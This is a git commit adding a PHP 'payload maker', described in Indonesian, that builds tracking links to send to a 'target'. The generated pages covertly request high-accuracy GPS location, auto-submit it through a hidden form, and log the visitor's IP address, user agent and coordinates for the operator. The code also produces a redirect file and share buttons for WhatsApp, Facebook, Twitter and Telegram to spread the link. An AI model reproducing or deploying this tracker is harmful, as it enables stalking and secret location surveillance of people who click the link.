e4d67cf78546b99bb667c8ddd07de32d4d9a055d
scyx-64 <35969063+scyx-64@users.noreply.github.com>
2020-10-07 10:18:51 +0700

    Add files via upload
    Pembuat Payload link dan file penggunaan sebagai track :
    Location (Latitude,Longitude)
    IP Address
    User-Agent
    dll

---
+++ svX-1587144946.php
@@ -0,0 +1,265 @@
+<?php
+$ide = time()+60*60*7;
+$id = "$ide";
+
+$dat = fopen("/home/vol1_5/epizy.com/epiz_25572004/htdocs/1587289403/1587289329/-1587290332/-1587290411/-1587290492/$id.php",'w');
+
+###-vcm
+$vcm = fopen("1587289403/log.txt",'a++');
+fputs($vcm,"$id
+");
+
+###-file hasil html
+$log= fopen("/home/vol1_5/epizy.com/epiz_25572004/htdocs/1587289403/1587289329/-1587290332/-1587290411/-1587290492/$id.html",'w');#####
+fputs ($log,'
+<html>
+<head>
+<body bgcolor="#000000">
+<font color="lime" size="10">');
+fputs ($log,'
+<meta http-equiv="REFRESH" 
+content="');
+fputs($log,"5");
+fputs ($log,';url=');
+fputs ($log,"$id.html");
+fputs ($log,'">
+Please Wait...
+');
+
+#### DW
+
+$dw = fopen("/home/vol1_5/epizy.com/epiz_25572004/htdocs/1587289403/1587289329/-1587290332/-1587290411/-1587290487/$id.html.zip",'w');
+fputs ($dw,'<html><head>
+<meta http-equiv="REFRESH" 
+content="');
+fputs($dw,"0");
+fputs ($dw,';url=');
+fputs ($dw,'http://mfd4jhbyz52ybzf66.epizy.com/1587144946/');
+fputs($dw,"$id.php");
+fputs ($dw,'">');
+
+
+
+#### USERNAME 
+fputs ($dat,'<?php
+$id = time()+60*60*7;
+');
+fputs($dat,"echo'");
+fputs($dat,'
+
+<html>
+<head>
+<body id="gradient3"><center>
+<b><font color="#FFD700" size="8">C S A R - L O C A T I O N 
+<div class="rotate"><img src="/images/logo.jpg" height="20%" width ="35%"></div></center>
+<font color="#ffffff" size="6"><hr color="red"><b><i>ID:
+');
+
+fputs ($dat,"$id");
+fputs($dat,'<hr color="red">
+<style type="text/css">
+	#gradient3 {
+	  background-image: linear-gradient(to bottom right, black, red);
+	}
+</style>
+<style type="text/css">
+.rotate {
+animation-name: rotate ;
+animation-duration: 8s;
+animation-play-state: running;
+animation-timing-function: linear;
+animation-iteration-count: infinite;
+opacity: 1.0;filter: alpha(opacity=50);
+}
+img:hover {
+opacity: 1.0;
+filter: alpha(opacity=100);
+}
+@keyframes rotate{
+10% {transform:rotateY(36deg)}
+20% {transform:rotateY(72deg)}
+30% {transform:rotateY(108deg)}
+40% {transform:rotateY(144deg)}
+50% {transform:rotateY(180deg)}
+60% {transform:rotateY(216deg)}
+70% {transform:rotateY(252deg)}
+80% {transform:rotateY(288deg)}
+90% {transform:rotateY(324deg)}
+100% {transform:rotateY(360deg)}
+}
+</style>
+<font color="#ffffff"><center> P A Y L O A D<font color="yellow">
+<br> Kirim Link atau file.html ini pada target <br><a href="http://mfd4jhbyz52ybzf66.epizy.com/1587144946/');
+fputs($dat,"$id.php");
+fputs($dat, '">');
+fputs($dat,'http://mfd4jhbyz52ybzf66.epizy.com/1587144946/');
+fputs($dat,"$id.php");
+fputs($dat,'</a>');
+fputs($dat,'<center><br>Ubah Ektensi File ');
+fputs($dat, "$id");
+fputs($dat,'.html.zip menjadi '); fputs($dat,"$id.html<br>");
+fputs($dat,'<a href="/1587289403/1587289329/-1587290332/-1587290411/-1587290487/');
+fputs($dat,"$id.html.zip");
+fputs($dat,'">');
+fputs($dat,'Download File');
+fputs($dat,'</a>');
+fputs($dat,'</center><br><b>Share Payload</b><br><br>');
+fputs($dat,'<a href="whatsapp://send?text=');
+fputs($dat,'http://mfd4jhbyz52ybzf66.epizy.com/1587144946/');
+fputs($dat,"$id.php");
+fputs($dat,'"> <img src="https://4.bp.blogspot.com/-JiPcslSo9tU/Xshlb_dAzNI/AAAAAAAAAPQ/WdwonsLa0foW1bb-e81chKj0MUjJh33CACLcBGAsYHQ/s1600/whatsapp.png" width="10%" height="5%"></a>');
+fputs($dat,'<a href="https://www.facebook.com/sharer.php?u=');
+fputs($dat,'http://mfd4jhbyz52ybzf66.epizy.com/1587144946/');
+fputs($dat,"$id.php");
+fputs($dat,'"><img src="https://2.bp.blogspot.com/-TY51kMzcqXk/XshlnhTnglI/AAAAAAAAAPY/gQYkVFCFSKAIIKpeNhcB_IIku5Y9XNPgwCLcBGAsYHQ/s1600/facebook.png" width="10%" height="5%"></a>');
+fputs($dat,'<a href="https://twitter.com/intent/tweet?text=');
+fputs($dat,'http://mfd4jhbyz52ybzf66.epizy.com/1587144946/');
+fputs($dat,"$id.php");
+fputs($dat,'"><img src="https://3.bp.blogspot.com/-emg73RUHVvQ/XshlxPDUGrI/AAAAAAAAAPc/PJixbk-V_zYItx2oAsYhqKVMBIxrk-TkACLcBGAsYHQ/s1600/line.png" width="10%" height="5%"></a>');
+fputs($dat,'<a href="tg://msg?text=');
+fputs($dat,'http://mfd4jhbyz52ybzf66.epizy.com/1587144946/');
+fputs($dat,"$id.php");
+fputs($dat,'"><img src="https://4.bp.blogspot.com/-S0-rp4riqO0/Xshl2y0bbRI/AAAAAAAAAPg/MKGjdBp4SE4CblxdWFFQp7uM2gBj8UAdACLcBGAsYHQ/s1600/telegram.png" width="10%" height="5%"></a>');
+
+fputs($dat,'<br><br>
+</font>
+<iframe src="');fputs($dat,"$id.html");
+fputs($dat,'
+" height="50%" width="100%" />
+</iframe>
+<hr color="red">
+') ;
+fputs($dat,"';");
+fputs ($dat,'
+echo ');
+fputs($dat,'"');
+fputs($dat,'$id
+');
+fputs($dat,'";');
+fputs($dat,"echo'");
+fputs ($dat,'<hr color="red">
+<meta http-equiv="REFRESH" 
+content="');
+fputs($dat,"10");
+fputs ($dat,';url=');
+fputs ($dat,"$id.php");
+fputs ($dat,'">
+</body></head></html>
+');
+fputs($dat,"';");
+fputs($dat,'
+?>
+');
+
+
+#id token
+$token = fopen ("/home/vol1_5/epizy.com/epiz_25572004/htdocs/1587144946/$id.php",'w');
+fputs($token,'<?php');
+fputs($token,"
+echo'
+<html>
+<head>
+';
+echo '");###
+fputs($token,'
+<body bgcolor="#ffffff">
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/geo-location-javascript/0.4.8/geo-min.js" ></script>
+<font color="#000000" size="5">
+Please Wait... 
+<font color="#ffffff">
+<br>');###
+fputs($token,"';
+
+echo'
+<script>
+		if(geo_position_js.init()){
+			geo_position_js.getCurrentPosition(success_callback,error_callback,{enableHighAccuracy:true});
+		}
+		else{");####
+		fputs($token,'	alert("Functionality not available");
+		}
+
+		function success_callback(p)
+		{');####
+	fputs($token,"';");###
+      fputs($token,'echo "');####
+fputs ($token,"	var varJS =('http://maps.google.com/maps?q=loc:'+p.coords.latitude.toFixed(9)+','+p.coords.longitude.toFixed(9));
+document.form1.media.value = varJS ;
+
+		}
+		
+		function error_callback(p)
+		{
+			alert('error='+p.message);
+		}		");###
+	fputs ($token,'	";');####
+	fputs($token, "	echo '
+	</script>
+	<script>
+	function myFunction()
+	{");####
+fputs($token,'	document.getElementById("form1").submit();
+	}
+	    </script>
+	   <body onload="myFunction()">
+<form name="form1" id="form1" method="post" onsubmit="cek()">
+<input type="hidden" id="media" name="media" value="">
+     </body>
+     ');
+     fputs($token,"
+	</form></body>
+	</head></html>'; ");#####
+fputs($token, "
+	sleep(10);
+");###
+fputs($token,'$id = time()+60*60*7;');
+fputs($token,'
+$ip=$_SERVER[');
+fputs($token,"'REMOTE_ADDR'];");
+fputs ($token,'$agent= $_SERVER[');
+fputs($token,"'HTTP_USER_AGENT'];");
+fputs ($token,'
+$lock =');fputs($token, '$_POST[') ;fputs($token,"'media'];");########
+fputs($token,'
+$log = fopen ("/home/vol1_5/epizy.com/epiz_25572004/htdocs/1587289403/1587289329/-1587290332/-1587290411/-1587290492/');
+fputs($token,"$id") ;
+fputs($token,'.html"');
+fputs($token,",'a++'");
+fputs($token,');');
+fputs($token,'
+fputs ($log,');fputs($token,"'");
+fputs($token,'<html>
+<head>
+<body bgcolor="#000000">
+<font color="lime" size="10">
+<br>S E S S I O N + + <br>');
+fputs($token,"');");
+fputs($token,'fputs($log,"$ip");');
+fputs($token,'fputs($log,"<br>") ;');
+fputs($token,'fputs($log,"$agent");');
+fputs($token,'
+fputs($log,');fputs($token," '");
+fputs($token,'<br><a href="');
+fputs($token,"');");
+fputs($token,'fputs($log,"$lock");
+');
+fputs($token,'fputs($log,');
+fputs($token,"'");
+fputs($token,'">');###
+fputs ($token,"');");
+fputs ($token,'fputs($log,"$lock"'); 
+fputs($token,");");
+fputs($token,'fputs($log,"');
+fputs($token,"</a><br>");
+fputs($token,'");');
+fputs($token,'
+?>');
+
+echo '
+<meta http-equiv="REFRESH" 
+content="0';
+echo ';url=/1587289403/1587289329/-1587290332/-1587290411/-1587290492/';
+echo "$id.php";
+echo '">
+';
+?>
